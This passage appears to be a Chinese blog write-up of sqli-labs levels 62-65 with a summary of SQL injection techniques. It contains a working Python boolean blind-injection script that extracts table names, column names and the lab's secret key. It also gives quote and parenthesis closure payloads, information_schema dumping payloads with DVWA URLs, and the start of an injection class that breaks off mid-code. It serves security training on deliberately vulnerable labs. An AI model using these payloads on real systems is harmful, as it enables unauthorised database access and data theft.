<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>没有报错注入</p>
<p>union select 也没有想要的结果</p>
<p>看来只能盲注了</p>
<p>这是false的时候</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121173940829.png" srcset="/img/loading.gif" lazyload alt="image-20210121173940829"></p>
<p>这是true的时候</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121174009901.png" srcset="/img/loading.gif" lazyload alt="image-20210121174009901"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>session = requests.session()<br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-62/&quot;</span><br>what_i_want = <span class="hljs-string">&quot;&quot;</span><br>table_name = <span class="hljs-string">&quot;&quot;</span><br>column_name = <span class="hljs-string">&quot;&quot;</span><br>key = <span class="hljs-string">&quot;&quot;</span><br>count = <span class="hljs-number">0</span><br>text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1&#x27;) and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;table_name&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    table_name+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(table_name)<br>    count = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is Your Loved table_name!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(table_name)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1&#x27;) and ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(table_name,i,mid)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;column_name&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    column_name+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(column_name)<br>    count = <span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> re<br>pattern = <span class="hljs-string">&quot;secret_....&quot;</span><br>column_name = re.findall(pattern,column_name)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is Your Loved column_name!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(column_name)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1&#x27;) and ascii(mid((select group_concat(&#123;&#125;) from challenges.&#123;&#125;),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(column_name,table_name,i,mid)<br>        <span class="hljs-built_in">print</span>(payload)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <span class="hljs-comment">#print(resp.text)</span><br>        <span class="hljs-comment"># if mid==79:</span><br>        <span class="hljs-comment">#     print(resp.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    key+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(key)<br>    count = <span class="hljs-number">0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is your loved key!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(key)<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121230005217.png" srcset="/img/loading.gif" lazyload alt="image-20210121230005217"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">zmqPWuhaQ6aWMJdissqGxwMk<br></code></pre></td></tr></table></figure>







<h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>报错不回显，可以布尔盲注</p>
<p>稍微修改上局的脚本接着用</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121230738448.png" srcset="/img/loading.gif" lazyload alt="image-20210121230738448"></p>
<h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1))%23<br></code></pre></td></tr></table></figure>

<p>同样是布尔盲注</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121231306768.png" srcset="/img/loading.gif" lazyload alt="image-20210121231306768"></p>
<h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;)%23<br></code></pre></td></tr></table></figure>

<p>还是布尔盲注</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210121231643079.png" srcset="/img/loading.gif" lazyload alt="image-20210121231643079"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><p>感觉闭合这个考点在这套题里面比较多见，这里做一个小小总结</p>
<p>select 语句，注入点的闭合，会用到以下几个符号</p>
<ul>
<li>单引号  <code>&#39;</code></li>
<li>双引号  <code>&quot;</code></li>
<li>圆括号  <code>)</code></li>
</ul>
<p>而闭合的方式会有以下几种</p>
<ul>
<li><p>无闭合</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$id</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p>单引号闭合</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; . $id . &#x27;</span><span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p>双引号闭合</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; . $id . &#x27;</span><span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p>括号闭合</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$id</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p>混合闭合</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(((<span class="hljs-subst">$id</span>))) LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>以上情况为，双引号+三对括号</p>
</blockquote>
</li>
</ul>
<p>面对这样的注入点</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nhann.top:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-4/</span>?id=<br></code></pre></td></tr></table></figure>

<p>我们的第一步往往是闭合</p>
<p>像这样</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://inhann.top:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">4</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nhann.top:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-4/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;%23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nhann.top:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-4/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;))%23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://inhann.top:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">4</span>/?id=<span class="hljs-number">1</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>在一定情况下，可以用下面pdf中所示的步骤完成闭合</p>
<p>不过还是得先明确以下所述闭合手段的局限性</p>
<blockquote>
<ul>
<li>id几乎直接放到select语句中，最多被escape了</li>
<li>发生syntax error的时候可以辨认</li>
</ul>
</blockquote>
<p>简单的情况下，先两个引号都试试，看看报没报错，都报错就说明没用到引号</p>
<p>然后加注释，加了注释还报错了，说明用到了括号</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入威力巨大</p>
<p>这里分享几个payload</p>
<h3 id="超级payload"><a href="#超级payload" class="headerlink" title="超级payload"></a>超级payload</h3><p>分享几个用得很爽的payload</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">select</span> (<span class="hljs-name">@</span>) from (<span class="hljs-name">select</span>(<span class="hljs-name">@:=0x00</span>),(<span class="hljs-name">select</span> (<span class="hljs-name">@</span>) from (<span class="hljs-name">information_schema.columns</span>) where (<span class="hljs-name">table_schema&gt;=@</span>) and (<span class="hljs-name">@</span>)in (<span class="hljs-name">@:=concat</span>(<span class="hljs-name">@</span>,<span class="hljs-number">0</span>x0D,<span class="hljs-number">0</span>x0A,&#x27; [ &#x27;,table_schema,&#x27; ] &gt; &#x27;,table_name,&#x27; &gt; &#x27;,column_name,<span class="hljs-number">0</span>x7C))))a)<br></code></pre></td></tr></table></figure>

<p>及其一般形式</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">select</span> (<span class="hljs-name">@</span>) from (<span class="hljs-name">select</span>(<span class="hljs-name">@:=0x00</span>),(<span class="hljs-name">select</span> (<span class="hljs-name">@</span>) from (<span class="hljs-name">db_data.table_data</span>) where (<span class="hljs-name">@</span>)in (<span class="hljs-name">@:=concat</span>(<span class="hljs-name">@</span>,<span class="hljs-number">0</span>x0D,<span class="hljs-number">0</span>x0A,<span class="hljs-number">0</span>x7C,&#x27; [ &#x27;,column_data1,&#x27; ] &gt; &#x27;,column_data2,&#x27; &gt; &#x27;,<span class="hljs-number">0</span>x7C))))a)<br></code></pre></td></tr></table></figure>

<ul>
<li>dvwa low</li>
</ul>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//localhost/dvwa/vulnerabilities/sqli/?id<span class="hljs-operator">=</span>&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-title">@p</span>) from (<span class="hljs-keyword">select</span>(<span class="hljs-title">@p</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x00</span>)<span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span> (<span class="hljs-title">@p</span>) from (information_schema.columns) where (table_schema&gt;<span class="hljs-operator">=</span><span class="hljs-title">@p</span>) <span class="hljs-keyword">and</span> (<span class="hljs-title">@p</span>)in (<span class="hljs-title">@p</span>:<span class="hljs-operator">=</span>concat(<span class="hljs-title">@p</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x0D</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x0A</span><span class="hljs-punctuation">,</span>&#x27; [ &#x27;<span class="hljs-punctuation">,</span>table_schema<span class="hljs-punctuation">,</span>&#x27; ] &gt; &#x27;<span class="hljs-punctuation">,</span>table_name<span class="hljs-punctuation">,</span>&#x27; &gt; &#x27;<span class="hljs-punctuation">,</span>column_name<span class="hljs-punctuation">,</span><span class="hljs-number">0x7C</span>))))a))<span class="hljs-variable">%23</span>&amp;Submit<span class="hljs-operator">=</span>Submit#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/php/blog/2021/01/image-20210130201015071.png" srcset="/img/loading.gif" lazyload alt="image-20210130201015071"></p>
<ul>
<li>dvwa medium</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-variable">@p</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(<span class="hljs-variable">@p</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (<span class="hljs-variable">@p</span>) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema<span class="hljs-operator">&gt;=</span><span class="hljs-variable">@p</span>) <span class="hljs-keyword">and</span> (<span class="hljs-variable">@p</span>)<span class="hljs-keyword">in</span> (<span class="hljs-variable">@p</span>:<span class="hljs-operator">=</span>concat(<span class="hljs-variable">@p</span>,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x5b</span>,table_schema,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x3e</span>,table_name,<span class="hljs-number">0x3e</span>,column_name,<span class="hljs-number">0x7C</span>))))a))<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">&amp;</span>Submit<span class="hljs-operator">=</span>Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/image-20210130202412762.png" srcset="/img/loading.gif" lazyload alt="image-20210130202412762"></p>
<ul>
<li>dvwa high</li>
</ul>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-title">@p</span>) from (<span class="hljs-keyword">select</span>(<span class="hljs-title">@p</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x00</span>)<span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span> (<span class="hljs-title">@p</span>) from (information_schema.columns) where (table_schema&gt;<span class="hljs-operator">=</span><span class="hljs-title">@p</span>) <span class="hljs-keyword">and</span> (<span class="hljs-title">@p</span>)in (<span class="hljs-title">@p</span>:<span class="hljs-operator">=</span>concat(<span class="hljs-title">@p</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x0D</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x0A</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x5b</span><span class="hljs-punctuation">,</span>table_schema<span class="hljs-punctuation">,</span><span class="hljs-number">0x5d</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x3e</span><span class="hljs-punctuation">,</span>table_name<span class="hljs-punctuation">,</span><span class="hljs-number">0x3e</span><span class="hljs-punctuation">,</span>column_name<span class="hljs-punctuation">,</span><span class="hljs-number">0x7C</span>))))a))#<br></code></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/image-20210130203457790.png" srcset="/img/loading.gif" lazyload alt="image-20210130203457790"></p>
<h3 id="select-回显数据"><a href="#select-回显数据" class="headerlink" title="select 回显数据"></a>select 回显数据</h3><p>最最基础的select回显数据，也分享一波</p>
<h3 id="Column-Num"><a href="#Column-Num" class="headerlink" title="Column Num"></a>Column Num</h3><p>获取columnNum的payload</p>
<h3 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h3><p>这里分享个布尔盲注的脚本</p>
<h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BoolSqlier</span>:<br>    url = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,database=<span class="hljs-string">&quot;&quot;</span></span>):<br>        self.database = database<br>        self.url = BoolSqlier.url<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">i,mid</span>):<br><br>            payload = <span class="hljs-string">&quot;1&#x27;and(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>            resp = requests.get(self.url,params=params)<br>            <span class="hljs-keyword">return</span> resp<br>            <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">database_i_ascii_bt_mid</span>(<span class="hljs-params">resp</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        database=<span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>            <span class="hljs-comment">#head 和 tail 决定了database的字符的取值范围</span><br>            head=<span class="hljs-number">32</span>         <br>            tail=<span class="hljs-number">127</span><br>            <span class="hljs-keyword">while</span> head&lt;tail:<br>       